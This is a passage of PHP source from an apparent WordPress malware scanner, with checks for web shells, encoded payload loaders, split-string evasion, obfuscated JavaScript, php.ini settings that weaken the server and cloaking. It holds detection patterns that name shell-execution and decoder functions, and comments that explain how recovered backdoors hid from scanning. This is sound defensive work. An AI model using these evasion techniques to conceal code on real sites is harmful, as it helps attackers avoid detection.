					// Inert by construction - see the note above.
					if ( preg_match( '/^\s*<\?php\s*(?:@?\s*(?:exit|die)\s*\(|__halt_compiler\s*\()/i', $c ) ) {
						continue;
					}

					$gated = (bool) preg_match( '/\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]]{0,40}\][^;]{0,80}(?:!==|!=|===|==)/', $c );
					$quiet = (bool) preg_match( '/error_reporting\s*\(\s*0\s*\)|ini_set\s*\(\s*[\'"]display_errors/i', $c );

					// Where plugins legitimately write PHP, location alone is
					// not enough; something about the file must also be wrong.
					if ( isset( $loose[ $dir ] ) && ! $gated && ! $quiet ) {
						continue;
					}

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Executable PHP in a data directory',
						'subject'  => self::display_path( $path ) . ' [' . number_format( $size ) . ' bytes in ' . $dir . '/]',
						'path'     => $path,
						'action'   => 'This is a PHP file inside wp-content/' . $dir . '/, which holds ' . $holds
							. ' and not code. Nothing legitimate installs an executable file here, which is why many hosts '
							. 'block PHP execution in these directories outright.'
							. ( $gated ? ' It compares a request parameter against a fixed value before doing anything, so it stays silent for anyone who does not already know that value - a password on a back door, not a feature.' : '' )
							. ( $quiet ? ' It suppresses PHP errors, so its failures never reach your logs.' : '' )
							. ' Judge this on where it is rather than on what it appears to do: the location is the finding. '
							. 'If you did not put it here, treat the site as compromised and find out how it arrived.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_character_built_identifiers(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		// $var[12] . followed by another index or a literal - a character
		// being appended to a string being spelled out.
		$rx_chain = '/\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d{1,3}\s*\]\s*\.\s*(?=\$[A-Za-z_]|[\'"])/';
		$rx_sink  = '/\b(?:eval|assert|create_function)\s*\(|\$[A-Za-z_][A-Za-z0-9_]*\s*\(\s*\$/';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					// Spelling one thirteen-character function name takes about
					// thirteen chains at roughly eight bytes each, so a minimal
					// carrier plus its haystack string and an eval sits close
					// to three hundred bytes. The floor is set below that
					// rather than at it.
					$size = $f->getSize();
					if ( $size < 200 || $size > 4194304 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
						continue;
					}
					$c = WPS_Utils::stripped( $path, $raw );

					$chains = preg_match_all( $rx_chain, $c );
					$chains = is_int( $chains ) ? $chains : 0;

					// 1.4.40: chr() is the other way to spell a name without
					// writing it. A must-use plugin recovered from a live site
					// built its control token with 295 chr() calls and scored
					// zero on the index-chain measure - same technique, other
					// mechanism. Zero across eighty files of real code.
					$chrs = preg_match_all( '/\bchr\s*\(\s*\d{1,3}/i', $c );
					$chrs = is_int( $chrs ) ? $chrs : 0;

					$built = max( $chains, $chrs );
					if ( $built < 8 ) {
						continue;
					}

					$sink = (bool) preg_match( $rx_sink, $c );
					$how  = ( $chrs > $chains ) ? 'chr() calls' : 'character-index chains';
					// Eight is already nearly three times the highest count
					// seen in ordinary code, but a name being built and then
					// executed removes any remaining doubt.
					if ( ! $sink && $built < 15 ) {
						continue;
					}

					$found[] = [
						'severity' => ( $sink || $built >= 15 ) ? 'critical' : 'high',
						'type'     => 'Identifiers assembled character by character',
						'subject'  => self::display_path( $path ) . ' [' . $built . ' ' . $how . ']',
						'path'     => $path,
						'action'   => 'This file builds strings by taking single characters out of another string by position '
							. 'and joining them - ' . $built . ' times. That is how a name like base64_decode is made to exist '
							. 'without ever appearing as text, so that searching the file for it finds nothing.'
							. ( $sink ? ' The result is then executed, which is the whole purpose of building it that way.' : '' )
							. ' Ordinary code does this a handful of times at most, and never to spell a function name. '
							. 'The readable parts of such a file are usually decoy: the sentence the characters are taken from '
							. 'is chosen to look harmless. Treat the site as compromised.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_self_extracting_payload(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		$rx_selfread = '/(?:file_get_contents|fopen|readfile|file)\s*\(\s*__FILE__/i';
		$rx_sink     = '/\b(?:eval|assert|create_function)\s*\(|preg_replace\s*\([^,]*[\'"][^\'"]*e[\'"]\s*,/i';
		// Known vendors that legitimately ship self-protecting PHP.
		$vendors     = [ 'monarx', 'ioncube', 'sourceguardian', 'zend guard', 'phpshield', 'sitelock', 'imunify' ];

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					$size = $f->getSize();
					if ( $size < 500 || $size > 4194304 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
						continue;
					}
					$c = WPS_Utils::stripped( $path, $raw );

					if ( ! preg_match( $rx_selfread, $c ) || ! preg_match( $rx_sink, $c ) ) {
						continue;
					}

					// Data past the final closing tag is the third leg.
					$tail = '';
					$pos  = strrpos( $c, '?>' );
					if ( false !== $pos ) {
						$tail = trim( substr( $c, $pos + 2 ) );
					}
					if ( strlen( $tail ) < 512 ) {
						continue;
					}

					$vendor = '';
					$low    = strtolower( substr( $raw, 0, 4096 ) );
					foreach ( $vendors as $v ) {
						if ( false !== strpos( $low, $v ) ) {
							$vendor = $v;
							break;
						}
					}

					$found[] = [
						'severity' => 'high',
						'type'     => 'Self-extracting PHP payload',
						'subject'  => self::display_path( $path ) . ' [' . number_format( strlen( $tail ) ) . ' bytes past the closing tag]',
						'path'     => $path,
						'action'   => 'This file reads its own contents, splits itself on its closing PHP tag, and executes what '
							. 'follows - ' . number_format( strlen( $tail ) ) . ' bytes of encoded data that is not in any variable '
							. 'or string, which is why it does not resemble ordinary obfuscation. '
							. ( '' !== $vendor
								? 'It carries a "' . $vendor . '" marker. Commercial security and licensing products protect their own code this way, so this may well be software your host installed rather than an intrusion. Confirm with your host before removing it.'
								: 'Malware uses this to hide a payload; commercial security and licensing products use it to stop their own code being read. Both look identical from outside.' )
							. ' Do not delete it on this finding alone: check whether your host or a licensed plugin installed it, and if nobody claims it, treat it as a backdoor.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_obfuscated_js_payload(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					$ext = strtolower( $f->getExtension() );
					$is_php = self::is_php_executable( $f );
					if ( ! $is_php && 'js' !== $ext ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					// Fifty hex identifiers fit in roughly seven hundred bytes
					// of script plus a small PHP wrapper, so the floor is set
					// below that rather than at a round number that would let
					// a compact carrier through.
					$size = $f->getSize();
					if ( $size < 900 || $size > 8388608 ) {
						continue;
					}
					$c = @file_get_contents( $path );
					if ( false === $c ) {
						continue;
					}

					$hex = preg_match_all( '/_0x[0-9a-f]{4,8}/i', $c );
					$hex = is_int( $hex ) ? $hex : 0;

					// A PHP file has no reason to carry any of this. A .js
					// file might conceivably be a licence-protected vendor
					// script, so it needs far more before it is worth saying.
					$floor = $is_php ? 50 : 400;
					if ( $hex < $floor ) {
						continue;
					}

					$printed = $is_php && preg_match( '/wp_footer|wp_head|wp_print_inline_script_tag|<script|echo\s|print\s/i', $c );

					$found[] = [
						'severity' => $is_php ? 'critical' : 'high',
						'type'     => $is_php ? 'Obfuscated JavaScript embedded in PHP' : 'Obfuscated JavaScript file',
						'subject'  => self::display_path( $path ) . ' [' . number_format( $hex ) . ' obfuscated identifiers]',
						'path'     => $path,
						'action'   => ( $is_php
								? 'This PHP file carries ' . number_format( $hex ) . ' JavaScript identifiers renamed to hexadecimal tokens, the signature of an automated JavaScript obfuscator. The PHP around it may read perfectly normally - it is only the envelope; the payload is the script it carries'
									. ( $printed ? ', and this file prints that script into your pages' : '' ) . '. '
								: 'This script has ' . number_format( $hex ) . ' identifiers renamed to hexadecimal tokens, the signature of an automated JavaScript obfuscator. ' )
							. 'Minified code is not obfuscated code: minifiers shorten names, they do not rename everything to hex, and a legitimate minified bundle scores zero on this. '
							. 'Obfuscation of a script that runs in your visitors\' browsers is done to stop anyone reading what it does. '
							. 'Deobfuscate it before deciding, or compare the file against a known-good copy from the vendor.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_hidden_identifiers(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		// Names worth hiding. Each is something a scanner, or an
		// administrator reading their own code, would search for.
		$sensitive = [
			'HTTP_USER_AGENT', 'HTTP_REFERER', 'REMOTE_ADDR',
			'base64_decode', 'gzinflate', 'gzuncompress', 'str_rot13', 'eval', 'assert',
			'move_uploaded_file', 'file_put_contents', 'shell_exec', 'system', 'passthru',
			'curl_exec', 'file_get_contents', 'fsockopen',
			'wp_footer', 'wp_head', 'admin_init', 'send_headers', 'body_class',
			'register_rest_route', 'heartbeat_settings', 'wp_print_inline_script_tag',
			'is_user_logged_in', 'current_user_can', 'administrator', 'wp_get_current_user',
			'googlebot', 'bingbot', 'yandex', 'spider', 'crawl', 'lighthouse', 'duckduck',
			'DONOTCACHEPAGE', 'DONOTCACHEOBJECT', 'DONOTMINIFY', 'nocache_headers',
		];

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					if ( ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					$size = $f->getSize();
					if ( $size < 200 || $size > 1048576 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
						continue;
					}
					$joined = WPS_Utils::deobfuscate_literals( $raw );
					if ( $joined === $raw ) {
						continue; // nothing was split at all
					}

					$hidden = [];
					foreach ( $sensitive as $name ) {
						$q = preg_quote( $name, '/' );
						if ( ! preg_match( '/' . $q . '/i', $raw ) && preg_match( '/' . $q . '/i', $joined ) ) {
							$hidden[] = $name;
						}
					}
					if ( count( $hidden ) < 2 ) {
						continue;
					}

					// The names chosen say what the file is for.
					$audience = array_intersect( $hidden, [ 'googlebot', 'bingbot', 'yandex', 'spider', 'crawl', 'lighthouse', 'duckduck', 'is_user_logged_in', 'administrator', 'current_user_can' ] );

					$found[] = [
						'severity' => count( $hidden ) >= 4 ? 'critical' : 'high',
						'type'     => 'Identifiers hidden from search (split-string evasion)',
						'subject'  => self::display_path( $path ) . ' [' . count( $hidden ) . ' hidden: ' . implode( ', ', array_slice( $hidden, 0, 5 ) ) . ']',
						'path'     => $path,
						'action'   => 'This file writes ' . count( $hidden ) . ' significant names in pieces joined back together at runtime - '
							. implode( ', ', $hidden ) . ' - so that searching the file for any of them finds nothing. '
							. 'There is no reason to write a function name in fragments except to defeat the search someone '
							. 'will run for it.'
							. ( $audience ? ' The names it hides include ' . implode( ', ', $audience ) . ', which means it is choosing who sees its behaviour - typically hiding from search engines and from whoever administers the site.' : '' )
							. ' Note that the file may otherwise look entirely ordinary, and its actual payload may live outside '
							. 'any PHP file, so judge it on this evasion rather than on how readable the rest of it appears.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_hardening_bypass_config(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		$rx_ini = [
			'/^\s*disable_functions\s*=\s*(?:NONE|none|""|\'\'|\s*$)/m' => 'switches off the host\'s list of disabled PHP functions',
			'/^\s*open_basedir\s*=\s*(?:OFF|off|NONE|none|""|\'\')/m'      => 'removes the directory restriction that confines PHP to your site',
			'/^\s*safe_mode\s*=\s*(?:Off|off|0)/m'                        => 'disables safe mode',
			'/^\s*(?:exec|shell_exec|system|passthru|popen)\s*=\s*(?:ON|on|1)/m' => 're-enables shell command execution',
		];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		foreach ( $roots as $root ) {
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 12000 ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					$name = strtolower( $f->getFilename() );
					if ( ! in_array( $name, [ 'php.ini', '.user.ini' ], true ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					if ( $f->getSize() > 65536 ) {
						continue;
					}
					$c = @file_get_contents( $path );
					if ( false === $c ) {
						continue;
					}

					$why = [];
					foreach ( $rx_ini as $rx => $does ) {
						if ( preg_match( $rx, $c ) ) {
							$why[] = $does;
						}
					}
					if ( empty( $why ) ) {
						continue;
					}

					$found[] = [
						'severity' => 'critical',
						'type'     => 'PHP configuration dropped to weaken the server',
						'subject'  => self::display_path( $path ) . ' [' . count( $why ) . ' setting(s)]',
						'path'     => $path,
						'action'   => 'This configuration file ' . implode( ', and ', $why ) . '. '
							. 'On CGI and FastCGI hosting a php.ini inside a directory is honoured for scripts in it, so this '
							. 'undoes the protections your host put in place to contain exactly this kind of break-in. '
							. 'It is not itself malicious code, which is why a scanner reading only PHP will never mention it - '
							. 'it is what makes the next piece of malicious code work. '
							. 'WordPress does not need such a file anywhere inside wp-content. If you did not create it, delete '
							. 'it and look for what put it there.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_encoded_payload_loader(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		$decoders = [
			'base64_decode', 'gzinflate', 'gzuncompress', 'gzdecode',
			'str_rot13', 'strrev', 'convert_uudecode', 'hex2bin', 'bin2hex',
		];
		$rx_sink = '/\b(?:eval|assert|create_function)\s*\(/i';
		$rx_blob = '/[\'"][A-Za-z0-9+\/=]{200,}[\'"]/';
		$rx_quiet = '/error_reporting\s*\(\s*0\s*\)|ini_set\s*\(\s*[\'"]display_errors[\'"]\s*,\s*(?:0|[\'"]0[\'"]|false)|ini_set\s*\(\s*[\'"]error_log[\'"]\s*,\s*(?:NULL|null)/i';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 5 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					if ( ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					$size = $f->getSize();
					if ( $size < 200 || $size > 2097152 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw ) {
						continue;
					}
					// 1.4.37: comments are removed before matching, because PHP
					// allows one between a function name and its bracket -
					// `/**\/@eval/**\/($x)` calls eval while defeating every
					// pattern that expects only whitespace there.
					$c = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;

					if ( ! preg_match( $rx_sink, $c ) || ! preg_match( $rx_blob, $c ) ) {
						continue;
					}

					$hits = [];
					foreach ( $decoders as $fn ) {
						// Deliberately NOT requiring a bracket: the technique
						// exists precisely to separate the name from the call.
						if ( preg_match( '/\b' . preg_quote( $fn, '/' ) . '\b/i', $c ) ) {
							$hits[] = $fn;
						}
					}
					if ( count( $hits ) < 2 ) {
						continue;
					}

					$quiet  = (bool) preg_match( $rx_quiet, $c );
					$hidden = ( $raw !== $c );

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Encoded payload behind a decoder chain',
						'subject'  => self::display_path( $path ) . ' [' . implode( ' -> ', array_slice( $hits, 0, 4 ) ) . ']',
						'path'     => $path,
						'action'   => 'This file executes code it decodes at runtime, through ' . count( $hits )
							. ' layers - ' . implode( ', ', $hits ) . ' - wrapped around a large encoded string. '
							. 'Nothing legitimate needs to conceal what it runs from the person running it.'
							. ( $hidden ? ' The decoder names are split across string concatenation so that a plain search for them finds nothing, which is deliberate evasion rather than style.' : '' )
							. ( $quiet ? ' It also suppresses PHP errors and the error log, so its failures never reach you.' : '' )
							. ' The visible file is only a loader; what it actually does is inside the encoded blob and cannot be judged from reading it. Treat the site as compromised.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_unauthenticated_file_manager(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		// Primitives that CHANGE the filesystem. Reads alone are not enough:
		// plenty of legitimate code reads files from a request.
		$mutators = [
			'move_uploaded_file' => 'upload arbitrary files',
			'file_put_contents'  => 'overwrite arbitrary files',
			'unlink'             => 'delete arbitrary files',
			'rename'             => 'rename arbitrary files',
			'rmdir'              => 'remove directories',
			'copy'               => 'copy arbitrary files',
			'fwrite'             => 'write to arbitrary files',
		];

		// 1.4.38: php://input counts as request input. A recovered backdoor
		// read its payload from the raw request body rather than from any
		// superglobal, and so did not look request-driven at all.
		$rx_request   = '/\$_(?:GET|POST|FILES|REQUEST|COOKIE)\b|php:\/\/input/i';
		// Anything that indicates the file runs inside WordPress. A file that
		// loads WordPress is subject to whatever that install already does.
		// 1.4.34: this must test for a GUARD, not for the mere mention of
		// WordPress. The first version matched `wp-load.php` and treated it as
		// evidence of legitimacy, which is backwards - a file that REQUIRES
		// wp-load.php is bootstrapping WordPress itself, which is exactly what
		// a standalone shell does when it wants WordPress's functions. The
		// legitimate pattern is the opposite: a file REFUSING to run unless
		// WordPress already loaded it. A recovered sample walked straight
		// through the old test by requiring wp-load.
		$rx_bootstrap = '/defined\s*\(\s*[\'"](?:ABSPATH|WPINC|WP_UNINSTALL_PLUGIN)[\'"]\s*\)/i';
		// Any authorisation of any kind, WordPress or otherwise.
		// 1.4.34: real authorisation only. The first version accepted a bare
		// $_SESSION or crypt(), which prove nothing - a shell uses a session to
		// remember its OWN login and crypt() to check its OWN password. A half
		// megabyte file manager escaped on the $_SESSION clause alone.
		$rx_auth      = '/current_user_can|is_user_logged_in|wp_verify_nonce|check_admin_referer|check_ajax_referer|PHP_AUTH_USER/i';
		// A browser-facing interface. A shell has one; a utility rarely does.
		$rx_ui        = '/<form[^>]*method\s*=\s*[\'"]?post|<input[^>]+type\s*=\s*[\'"]?file/i';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 5 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					if ( ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					// No meaningful floor. The cloaking check ignores small
					// files because a doorway page needs bulk; a file manager
					// does not. Two mutation primitives fit comfortably in a
					// hundred bytes, and a compact shell is more suspicious
					// than a large one, not less - an earlier 150-byte floor
					// here would have silently skipped exactly those.
					$size = $f->getSize();
					if ( $size < 40 || $size > 524288 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw ) {
						continue;
					}
					// Resolve escapes first, so a shell that hides its function
					// names is judged on the same terms as one that does not.
					$c = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;

					if ( preg_match( $rx_bootstrap, $c ) || preg_match( $rx_auth, $c ) ) {
						continue;
					}
					if ( ! preg_match( $rx_request, $c ) ) {
						continue;
					}

					$hits = [];
					foreach ( $mutators as $fn => $does ) {
						if ( preg_match( '/\b' . preg_quote( $fn, '/' ) . '\s*\(/i', $c ) ) {
							$hits[ $fn ] = $does;
						}
					}
					// 1.4.38: one primitive is enough, full stop.
					//
					// 1.4.34 already made an exception for uploads, on the
					// reasoning that no benign unauthenticated upload endpoint
					// exists. The same is true of any single write: a file
					// recovered from a live toolkit - named backdor.php by its
					// own author - read its payload from php://input and wrote
					// it to disk with file_put_contents alone, and the
					// two-primitive rule let it through.
					//
					// Writing attacker-controlled bytes to a path on the server
					// with nothing checking who asked is remote code deployment
					// whether or not a second primitive keeps it company.
					// Measured across seventy-nine files of real theme and
					// plugin code, relaxing this adds no findings at all,
					// because legitimate code either loads WordPress, checks
					// something, or takes no request input.
					$is_upload = isset( $hits['move_uploaded_file'] );
					if ( count( $hits ) < 1 ) {
						continue;
					}

					$has_ui   = (bool) preg_match( $rx_ui, $c );
					$severity = ( count( $hits ) >= 3 || $has_ui || $is_upload ) ? 'critical' : 'high';

					$verdict = ( 'critical' === $severity )
						? 'This is a file manager that anyone on the internet can use. '
						: 'This file can be used by anyone on the internet to modify files on this server. ';

					$found[] = [
						'severity' => $severity,
						'type'     => 'Unauthenticated file manager (web shell)',
						'subject'  => self::display_path( $path ) . ' [' . implode( ', ', array_keys( $hits ) ) . ']',
						'path'     => $path,
						'action'   => $verdict
							. 'It does not load WordPress, so none of your site\'s permissions apply to it, and it checks no '
							. 'password, capability, nonce or session of any kind - yet it can ' . implode( ', ', array_values( $hits ) )
							. ' from request input'
							. ( $has_ui ? ', and it presents a browser interface for doing so' : '' ) . '. '
							. 'Note that it is not obfuscated: it did not need to hide, which is why signature and '
							. 'obfuscation checks do not flag it. '
							. 'If you did not put this here, treat the site as compromised and look for how it arrived. '
							. 'If a plugin or your host did put it here, it is still reachable by anyone and should be '
							. 'removed or placed behind authentication.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_doorway_cloaking(): array {
		$found = [];
		if ( ! class_exists( 'WPS_Utils' ) ) {
			return $found;
		}
		$self_dir = realpath( WPS_DIR ) ?: '';

		$rx_crawlers = '/(?:googlebot|baiduspider|bingbot|yandexbot|slurp|duckduckbot)/i';
		$rx_referers = '/(?:google\.co\.jp|yahoo\.co\.jp|baidu\.com|google\.com)[^\n]{0,80}(?:yahoo|bing|baidu|yandex)/i';
		$rx_ua_read  = '/HTTP_USER_AGENT/';
		$rx_ref_read = '/HTTP_REFERER/';
		$rx_silence  = '/error_reporting\s*\(\s*0\s*\)|ini_set\s*\(\s*[\'"]error_log[\'"]\s*,\s*(?:NULL|null|[\'"]{2})/';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 4 );
				foreach ( $iter as $f ) {
					if ( ++$count > 6000 ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					if ( ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					if ( '' !== $self_dir && strpos( realpath( $path ) ?: $path, $self_dir ) === 0 ) {
						continue; // never flag ourselves
					}
					$size = $f->getSize();
					if ( $size < 200 || $size > 524288 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw ) {
						continue;
					}
					$c = WPS_Utils::deobfuscate_literals( $raw );

					$has_crawlers = (bool) preg_match( $rx_crawlers, $c );
					if ( ! $has_crawlers ) {
						continue;
					}
					$reads_ua  = (bool) preg_match( $rx_ua_read, $c );
					$reads_ref = (bool) preg_match( $rx_ref_read, $c );
					$has_ref   = (bool) preg_match( $rx_referers, $c );
					$silences  = (bool) preg_match( $rx_silence, $c );

					// One signal is ordinary bot handling. Two is cloaking.
					$signals = [];
					if ( $reads_ua && $has_crawlers ) {
						$signals[] = 'branches on the crawler user agent';
					}
					if ( $reads_ref && $has_ref ) {
						$signals[] = 'branches on a search-engine referrer';
					}
					if ( $silences ) {
						$signals[] = 'suppresses PHP errors and the error log';
					}
					if ( count( $signals ) < 2 ) {
						continue;
					}

					$escaped = ( $raw !== $c ) ? ' The strings were hex-escaped in the file and only matched after unescaping, which is itself deliberate evasion.' : '';

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Search-engine cloaking (doorway spam)',
						'subject'  => self::display_path( $path ),
						'path'     => $path,
